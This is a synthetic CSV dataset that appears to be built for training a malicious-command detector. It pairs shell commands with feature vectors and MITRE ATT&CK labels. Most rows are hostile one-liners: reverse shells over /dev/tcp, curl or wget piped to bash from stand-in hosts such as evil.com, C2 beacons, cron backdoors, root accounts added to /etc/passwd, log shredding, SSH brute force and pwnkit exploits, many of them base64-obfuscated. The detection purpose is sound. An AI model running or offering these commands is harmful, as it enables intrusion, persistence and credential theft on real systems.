nohup shred -u /var/log/auth.log &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1070_Indicator_Removal'],synthetic
tftp -i 10.0.0.99 GET payload.exe C:\Windows\Temp\payload.exe,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
ip link show | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 1]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
arp -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
curl -s http://c2.attacker.com/beacon,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1496_Resource_Hijacking'],synthetic
"bash -c ""scp attacker@10.0.0.99:/tools/linpeas.sh /tmp/""","[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1496_Resource_Hijacking'],synthetic
"bash -c ""cat /proc/version""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1082_System_Information_Discovery'],synthetic
"bash -c ""New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe' && echo done""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sha256sum /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
time echo 'cGVybCAtZSAndXNlIFNvY2tldDsgLi4uJw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
time echo 'Y2F0IC9ldGMvcmVzb2x2LmNvbmY=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
df -h,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
echo 'bm1jbGkgY29ubmVjdGlvbiBzaG93' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
medusa  -h  10.0.0.1  -u  root  -P  /tmp/passwords.txt  -M  ssh,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1110_Brute_Force'],synthetic
systemctl enable --now malicious.service | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 1]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ls -la /root /etc /var/www,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
netstat -tulpn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
nmap -A -T4 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.52, 0, 0]",['T1110_Brute_Force'],synthetic
cat ~/.aws/credentials,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
ssh -L 8080:internal:80 user@jump.host ; sleep 1,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup useradd -m -s /bin/bash -G sudo newadmin &,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1098_Account_Manipulation'],synthetic
at now + 1 minute <<< '/tmp/payload' ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.0, 0.44, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo  'd2dldCAtcSBodHRwOi8vbWluZXIuY29tL3htcmlnIC1PIC90bXAveG1yICYmIGNobW9kICt4IC90bXAveG1yICYmIC90bXAveG1yIC1vIHBvb2wubWluZXhtci5jb206NDQz'  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup sh -c 'curl http://evil.com/shell.sh | bash' &,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
nohup echo 'bWVkdXNhIC1oIDEwLjAuMC4xIC11IHJvb3QgLVAgL3RtcC9wYXNzd29yZHMudHh0IC1NIHNzaA==' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1110_Brute_Force', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo -u www-data bash | > /dev/null 2>&1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.32, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ls -la /root /etc /var/www,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
usermod -aG sudo compromised_user && echo done,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""fping -a -g 192.168.1.0/24 2>/dev/null | > /dev/null 2>&1""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.44, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time gcc exploit.c -o exploit && ./exploit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
ln  -s  /tmp/backdoor.sh  /etc/cron.d/system-update  &&  history  -c,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"python3 -c ""import urllib.request; urllib.request.urlretrieve('http://evil.com/payload', '/tmp/payload')""","[0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
git clone https://github.com/user/repo.git,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
wget http://attacker.com/payload -O /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
gcc exploit.c -o exploit && ./exploit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
netstat -tulpn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
"bash -c ""curl -s http://c2.attacker.com/beacon && sleep 1""","[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
bash -i >& /dev/tcp/10.0.0.99/4444 0>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
nohup echo 'Y3VybCAtc0wgaHR0cDovL2V2aWwuY29tL3NoZWxsLnNoIC1vIC90bXAvc2hlbGwuc2g=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
history -c && history -w,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]",['T1070_Indicator_Removal'],synthetic
env | grep PATH,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 0]",['BENIGN'],synthetic
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1110_Brute_Force'],synthetic
(crontab -l; echo '* * * * * /tmp/payload.sh') | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.48, 1, 0]",['T1053_Scheduled_Task'],synthetic
echo  'cGFzc3dkIC1kIHJvb3Q='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
sudo echo 'cmVnIGFkZCBIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBCYWNrZG9vciAvZCBDOlxwYXlsb2FkLmV4ZSA7IGNobW9kICt4IC90bXAvcGF5bG9hZA==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
getent passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1087_Account_Discovery'],synthetic
./CVE-2021-4034 ; chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
openssl  rand  -hex  16,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
"bash -c ""ssh admin@localhost""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
"bash -c ""echo 'bm1hcCAtc24gMTkyLjE2OC4xLjAvMjQgOyBzbGVlcCAx' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo ./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash',"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
echo 'Li9kaXJ0eWNvdyAvZXRjL3Bhc3N3ZCAncm9vdDo6MDowOnJvb3Q6L3Jvb3Q6L2Jpbi9iYXNoJw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
cat /etc/os-release,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
"bash -c ""nmap -sn 192.168.1.0/24 && echo done""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.32, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ip neigh show | history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo wmiexec.py domain/admin:pass@10.0.0.5,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1021_Remote_Services'],synthetic
"bash -c ""medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh""","[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 0, 0]",['T1110_Brute_Force'],synthetic
lscpu,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1082_System_Information_Discovery'],synthetic
echo 'Y2F0IC9ldGMvcGFzc3dkIHwgYXdrIC1GOiAnJDMgPj0gMTAwMCc=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
traceroute google.com,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
chmod 644 /etc/hosts,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
w,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
echo 'cG93ZXJzaGVsbC5leGUgLUVuY29kZWRDb21tYW5kIEpBQnpBLi4u' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup find / -name 'id_rsa' 2>/dev/null &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
groups $(whoami) ; echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ssh admin@localhost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1078_Valid_Accounts'],synthetic
cat /etc/passwd | grep -v nologin | grep -v false,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.4, 0.4, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
"runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""' ; chmod +x /tmp/payload","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 1, 1]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
tftp -i 10.0.0.99 GET payload.exe C:\Windows\Temp\payload.exe,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
./pwnkit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
id | echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.2, 0.16, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""' | sleep 1","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
echo 'bm1hcCAtc1YgLXAgMjIsODAsNDQzIDEwLjAuMC4wLzI0ICYmIGNobW9kICt4IC90bXAvcGF5bG9hZA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe' | chmod +x /tmp/payload,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.48, 1, 1]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wmic useraccount list,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1087_Account_Discovery'],synthetic
gcc exploit.c -o exploit && ./exploit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
echo 'Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAtdiBub2xvZ2lu' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuOTkvNDQ0NCAwPiYx' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo ip link show ; echo done,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1 && history -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
su - admin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1078_Valid_Accounts'],synthetic
whoami /all,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
ls -la /root /etc /var/www,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
su  -s  /bin/bash  www-data  ;  history  -c,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ls -la /root /etc /var/www,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
wget  -q  -O-  --header='X-Auth:  token123'  http://evil.com/cmd  &&  >  /dev/null  2>&1,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.4, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time echo 'dXNlcmFkZCAtbyAtdSAwIC1nIDAgLU0gLWQgL3Jvb3QgLXMgL2Jpbi9iYXNoIGdob3N0IHwgc2xlZXAgMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
net localgroup administrators && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo echo '*/5 * * * * curl http://c2.com/beacon' | crontab -,"[0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.48, 1, 0]",['T1053_Scheduled_Task'],synthetic
nbtscan 192.168.1.0/24 | echo done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wget http://attacker.com/payload -O /tmp/payload && echo done,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'ZG1lc2cgfCBoZWFkIC0yMA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1082_System_Information_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
cat /etc/passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1003_OS_Credential_Dumping'],synthetic
time crontab -l,"[0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
cat /tmp/encoded | xxd -r -p | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
"time php -r '$sock=fsockopen(""10.0.0.99"",4444); ...'","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
sha256sum /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
find  /  -name  '*.conf'  -readable  2>/dev/null  |  head  -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1110_Brute_Force'],synthetic
nbtscan 192.168.1.0/24 && history -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
./CVE-2021-4034,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
echo 'c2VjcmV0c2R1bXAucHkgLWp1c3QtZGMtdXNlciBBZG1pbmlzdHJhdG9yIGRvbWFpbi91c2VyOnBhc3NAREMgOyBlY2hvIGRvbmU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup echo 'cm91dGUgLW4gfCA+IC9kZXYvbnVsbCAyPiYx' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup crontab -l &,"[0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
./pwnkit ; chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
curl -s http://c2.attacker.com/beacon | > /dev/null 2>&1,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.28, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /proc/version ; history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
./pwnkit && > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo echo 'bGRhcHNlYXJjaCAteCAtYiAnZGM9ZG9tYWluLGRjPWNvbScgJyhvYmplY3RDbGFzcz1wZXJzb24pJw==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
bash -i >& /dev/tcp/10.0.0.99/4444 0>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo '@reboot /tmp/backdoor.sh' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1053_Scheduled_Task'],synthetic
